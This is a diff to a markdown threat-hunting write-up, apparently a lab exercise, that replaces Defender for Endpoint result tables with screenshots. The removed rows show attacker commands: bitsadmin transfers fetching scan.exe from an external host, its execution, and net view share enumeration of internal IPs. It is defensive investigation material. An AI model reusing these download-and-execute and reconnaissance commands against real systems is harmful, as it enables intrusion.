@@ -501,22 +501,14 @@ DeviceProcessEvents
 
 #### 📋 MDE Result — scan.exe execution with full arguments and bitsadmin download chain (Q23–Q25, Q28)
 
-| TimeGenerated [UTC] | FileName | ProcessCommandLine | AccountName |
-|---|---|---|---|
-| 1/27/2026, 8:17:59 PM | advanced_ip_scanner.exe | `"advanced_ip_scanner.exe" /portable "C:/Users/david.mitchell/Downloads/" /lng en_us` | david.mitchell |
-| 1/27/2026, 8:17:46 PM | scan.tmp | `"scan.tmp" /SL5=$5C051E,20439558,139776,C:\Users\david.mitchell\Downloads\scan.exe` | david.mitchell |
-| 1/27/2026, 8:17:45 PM | scan.exe | `"scan.exe"` | david.mitchell |
-| 1/27/2026, 8:16:32 PM | bitsadmin.exe | `bitsadmin /transfer job1 https://sync.cloud-endpoint.net/scan.exe C:\Users\david.mitchell\Downloads\scan.exe` | david.mitchell |
-| 1/27/2026, 8:15:06 PM | bitsadmin.exe | `bitsadmin /transfer job1 https://sync.cloud-endpoint.net/scan.exe C:\Users\david.mitchell\Downloads\scan.exe` | david.mitchell |
-| 1/27/2026, 8:15:01 PM | bitsadmin.exe | `bitsadmin /transfer job1 https://sync.cloud-endpoint.net/scan.exe C:\Temp\scan.exe` | david.mitchell |
-| 1/27/2026, 8:14:03 PM | bitsadmin.exe | `bitsadmin /transfer job1 https://sync.cloud-endpoint.net/scan.exe C:\Users\Public\scan.exe` | david.mitchell |
+
+<img width="1273" height="292" alt="Screenshot 2026-03-18 at 10 48 19" src="https://github.com/user-attachments/assets/cad02c9c-cf9f-40a5-91cf-e16a1f5f1acc" />
+
 
 #### 📋 MDE Result — net.exe share enumeration on AS-SRV (Q26, Q27)
 
-| TimeGenerated [UTC] | DeviceName | ProcessCommandLine | AccountName | FileName |
-|---|---|---|---|---|
-| 1/27/2026, 10:17:40 PM | as-srv | `"net.exe" view \\10.1.0.183` | as.srv.administrator | net.exe |
-| 1/27/2026, 10:17:40 PM | as-srv | `"net.exe" view \\10.1.0.154` | as.srv.administrator | net.exe |
+<img width="883" height="141" alt="Screenshot 2026-03-18 at 10 48 55" src="https://github.com/user-attachments/assets/90d1452b-7bec-450c-a69b-a4091856b4ae" />
+
 
 ---
 
